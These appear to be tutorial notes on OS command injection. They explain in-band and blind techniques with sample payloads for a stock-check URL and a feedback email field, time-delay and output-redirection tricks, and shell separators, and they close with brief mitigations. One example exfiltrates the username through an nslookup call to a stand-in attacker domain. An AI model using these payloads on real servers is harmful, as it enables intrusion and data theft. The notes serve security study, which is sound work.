# OS Command Injection

OS command injection (also known as shell injection) is a web security vulnerability that allows an attacker to execute arbitrary operating system (OS) commands on the server that is running an application, and typically fully compromise the application and all its data. Very often, an attacker can leverage an OS command injection vulnerability to compromise other parts of the hosting infrastructure, exploiting trust relationships to pivot the attack to other systems within the organization.

## Execute Arbitrary commands :

`**https://insecure-website.com/stockStatus?productID=381&storeID=29**`

consider given link there may be legacy system running script behind may be it run script with parameters ...

ie : python3 stockCheck.py 381 29

then this script gives output based on params. now assume we give additional input `**& echo "abc"**` , application may also print **abc** as application output. so input should look like...

`**https://insecure-website.com/stockStatus?productID=381%20&%20echo%20"abc"%20&storeID=29**` that will execute python3 [stockCheck.py](http://stockCheck.py) 381 & echo "abc" & 29

Output from legacy system would look like...

```bash
Error - productID was not provided

            abc

            29: command not found
```

## Commands you can use :

| Purpose of command | Linux | Windows |
| --- | --- | --- |
| Name of current user | whoami | whoami |
| Operating system | uname -a | ver |
| Network configuration | ifconfig | ipconfig /all |
| Network connections | netstat -an | netstat -an |
| Running processes | ps -ef | tasklist |

## Blind Command Injection :

Many instances of OS command injection are blind vulnerabilities. This means that the application does not return the output from the command within its HTTP response. Blind vulnerabilities can still be exploited, but different techniques are required.

in feedback like functionality, site may ask for email address to supply it to admin

`**mail -s "This site is great" -aFrom:peter@normal-user.net feedback@vulnerable-website.com**`

so use something different payload like email address like `**peter@normal-user.net & echo "abc" &**` 

or we can add command in comment section too.

## Blind OS command Injection using time delays :

sometime normal output is not shown to user, so try to trigger time delays using commands like `**ping -c 10**` or `**sleep**, etc`

`**& ping -c 10 127.0.0.1 &**`

This command will cause the application to ping its loopback network adapter for 10 seconds.

## blind OS command injection by redirecting output :

You can redirect the output from the injected command into a
 file within the web root that you can then retrieve using your browser.
 For example, if the application serves static resources from the 
filesystem location `**/var/www/static**`, then you can submit the following input:

`**& whoami > /var/www/static/whoami.txt &**`

we can retrieve output at `**https://vulnerable-website.com/whoami.txt**` 

### Or we can use OAST techniques to interact with collaborator or exfiltrate data

`**& nslookup kgji2ohoyw.web-attacker.com &` - interact**

`**& nslookup `whoami`.kgji2ohoyw.web-attacker.com &` - exfiltrate username**

## Ways to inject OS Commands :

in all OS :

- `&`
- `&&`
- `|`
- `||`

in unix :

- `;`
- Newline (`0x0a` or `\n`)

On Unix-based systems, you can also use backticks or the dollar character to perform inline execution of an injected command within the original command:

- ``` injected command ```
- `$(` injected command `)`

# Mitigations :

Don't use OS commands directly from application but apply safer API

strong input validation is must needed

use white listing

only allow alphanumerical characters
